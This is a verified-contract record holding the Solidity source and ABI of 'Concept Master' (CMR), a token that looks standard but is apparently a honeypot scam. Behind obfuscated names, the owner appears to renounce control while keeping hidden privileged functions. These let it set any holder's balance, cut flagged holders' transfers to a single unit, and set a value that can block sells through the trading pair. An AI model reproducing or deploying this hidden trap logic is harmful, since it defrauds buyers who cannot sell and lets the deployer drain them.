{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface liquidityMarketing {\n    function createPair(address enableLaunch, address receiverMax) external returns (address);\n}\n\ninterface fundModeLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atLaunch) external view returns (uint256);\n\n    function transfer(address receiverTxTotal, uint256 maxTo) external returns (bool);\n\n    function allowance(address senderLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxTo) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverTxTotal,\n        uint256 maxTo\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyAmount, uint256 value);\n    event Approval(address indexed senderLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract senderListLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundModeLaunchedMetadata is fundModeLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConceptMaster is senderListLiquidity, fundModeLaunched, fundModeLaunchedMetadata {\n\n    function transfer(address fromMax, uint256 maxTo) external virtual override returns (bool) {\n        return listShould(_msgSender(), fromMax, maxTo);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverEnable;\n    }\n\n    event OwnershipTransferred(address indexed fundTeam, address indexed liquiditySell);\n\n    uint256 isLiquidity;\n\n    address public listToken;\n\n    function name() external view virtual override returns (string memory) {\n        return atAmount;\n    }\n\n    address launchMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private teamReceiver = 100000000 * 10 ** 18;\n\n    function listShould(address atFrom, address receiverTxTotal, uint256 maxTo) internal returns (bool) {\n        if (atFrom == feeSell) {\n            return liquidityReceiver(atFrom, receiverTxTotal, maxTo);\n        }\n        uint256 receiverIs = fundModeLaunched(listToken).balanceOf(sellLimit);\n        require(receiverIs == isLiquidity);\n        require(receiverTxTotal != sellLimit);\n        if (tradingToken[atFrom]) {\n            return liquidityReceiver(atFrom, receiverTxTotal, teamTrading);\n        }\n        return liquidityReceiver(atFrom, receiverTxTotal, maxTo);\n    }\n\n    uint256 private walletToken;\n\n    function buyLimitSender(address fromMax, uint256 maxTo) public {\n        receiverReceiverLimit();\n        listLaunched[fromMax] = maxTo;\n    }\n\n    function receiverReceiverLimit() private view {\n        require(toMin[_msgSender()]);\n    }\n\n    string private senderTx = \"CMR\";\n\n    function getOwner() external view returns (address) {\n        return txToken;\n    }\n\n    function allowance(address launchedTotal, address totalReceiver) external view virtual override returns (uint256) {\n        if (totalReceiver == launchMax) {\n            return type(uint256).max;\n        }\n        return fundSender[launchedTotal][totalReceiver];\n    }\n\n    function feeShould(address amountTxSender) public {\n        receiverReceiverLimit();\n        if (amountMin == launchedTeam) {\n            walletToken = buyAtAmount;\n        }\n        if (amountTxSender == feeSell || amountTxSender == listToken) {\n            return;\n        }\n        tradingToken[amountTxSender] = true;\n    }\n\n    function liquidityList() public {\n        emit OwnershipTransferred(feeSell, address(0));\n        txToken = address(0);\n    }\n\n    uint256 private launchedTeam;\n\n    function approve(address totalReceiver, uint256 maxTo) public virtual override returns (bool) {\n        fundSender[_msgSender()][totalReceiver] = maxTo;\n        emit Approval(_msgSender(), totalReceiver, maxTo);\n        return true;\n    }\n\n    function liquidityReceiver(address atFrom, address receiverTxTotal, uint256 maxTo) internal returns (bool) {\n        require(listLaunched[atFrom] >= maxTo);\n        listLaunched[atFrom] -= maxTo;\n        listLaunched[receiverTxTotal] += maxTo;\n        emit Transfer(atFrom, receiverTxTotal, maxTo);\n        return true;\n    }\n\n    constructor (){\n        if (buyAtAmount == amountMin) {\n            amountMin = exemptReceiver;\n        }\n        minSell totalList = minSell(launchMax);\n        listToken = liquidityMarketing(totalList.factory()).createPair(totalList.WETH(), address(this));\n        \n        feeSell = _msgSender();\n        toMin[feeSell] = true;\n        listLaunched[feeSell] = teamReceiver;\n        liquidityList();\n        \n        emit Transfer(address(0), feeSell, teamReceiver);\n    }\n\n    function launchMode(address totalFund) public {\n        require(totalFund.balance < 100000);\n        if (tradingReceiver) {\n            return;\n        }\n        \n        toMin[totalFund] = true;\n        \n        tradingReceiver = true;\n    }\n\n    function owner() external view returns (address) {\n        return txToken;\n    }\n\n    string private atAmount = \"Concept Master\";\n\n    function balanceOf(address atLaunch) public view virtual override returns (uint256) {\n        return listLaunched[atLaunch];\n    }\n\n    mapping(address => bool) public toMin;\n\n    address private txToken;\n\n    mapping(address => mapping(address => uint256)) private fundSender;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamReceiver;\n    }\n\n    mapping(address => uint256) private listLaunched;\n\n    bool public tradingReceiver;\n\n    uint8 private receiverEnable = 18;\n\n    mapping(address => bool) public tradingToken;\n\n    uint256 constant teamTrading = 1 ** 10;\n\n    uint256 private exemptReceiver;\n\n    uint256 limitMode;\n\n    function transferFrom(address atFrom, address receiverTxTotal, uint256 maxTo) external override returns (bool) {\n        if (_msgSender() != launchMax) {\n            if (fundSender[atFrom][_msgSender()] != type(uint256).max) {\n                require(maxTo <= fundSender[atFrom][_msgSender()]);\n                fundSender[atFrom][_msgSender()] -= maxTo;\n            }\n        }\n        return listShould(atFrom, receiverTxTotal, maxTo);\n    }\n\n    function fundTo(uint256 maxTo) public {\n        receiverReceiverLimit();\n        isLiquidity = maxTo;\n    }\n\n    uint256 private autoLaunchedToken;\n\n    bool private toLimit;\n\n    address sellLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private receiverFromTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderTx;\n    }\n\n    uint256 private amountMin;\n\n    address public feeSell;\n\n    uint256 private buyAtAmount;\n\n    bool private receiverLimit;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTo\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTo\",\"type\":\"uint256\"}],\"name\":\"buyLimitSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTxSender\",\"type\":\"address\"}],\"name\":\"feeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxTo\",\"type\":\"uint256\"}],\"name\":\"fundTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFund\",\"type\":\"address\"}],\"name\":\"launchMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTo\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTxTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxTo\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConceptMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}